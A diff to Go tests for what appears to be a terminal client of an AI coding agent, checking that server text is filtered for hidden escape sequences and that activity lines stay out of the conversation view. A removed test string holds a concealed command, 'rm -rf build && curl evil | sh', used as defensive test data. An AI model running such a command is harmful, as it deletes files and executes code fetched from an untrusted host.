@@ -288,10 +288,14 @@ func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
 		}
 	}
 	got := screen(m)
-	for _, want := range []string{"rm -rf build  [8m&& curl evil | sh [28m", "approval needed: Push [8m to main", "boom [8m hidden"} {
+	for _, want := range []string{"approval needed: Push [8m to main", "boom [8m hidden"} {
 		if !strings.Contains(got, want) {
 			t.Errorf("screen lacks %q:\n%s", want, got)
 		}
+	}
+	// Activity is kept, filtered, for the work Sessions pane; the conversation does not show it.
+	if strings.Contains(got, "rm -rf build") {
+		t.Errorf("the conversation shows activity:\n%s", got)
 	}
 }
 
@@ -302,10 +306,8 @@ func TestTagMessagesShowAtOnceAndTheReplyEndsTheTurn(t *testing.T) {
 		client.FollowEvent{Kind: client.EventStatus, Text: "Running pnpm test"},
 	)
 	got := screen(m)
-	for _, want := range []string{"I'll run the tests, then fix what fails.", "· Running pnpm test"} {
-		if !strings.Contains(got, want) {
-			t.Fatalf("screen lacks %q while the turn runs:\n%s", want, got)
-		}
+	if !strings.Contains(got, "I'll run the tests, then fix what fails.") || strings.Contains(got, "Running pnpm test") {
+		t.Fatalf("the running turn shows its activity, or not its message:\n%s", got)
 	}
 	m = followed(t, m,
 		client.FollowEvent{Kind: client.EventStatus, Text: "Editing src/app.ts"},
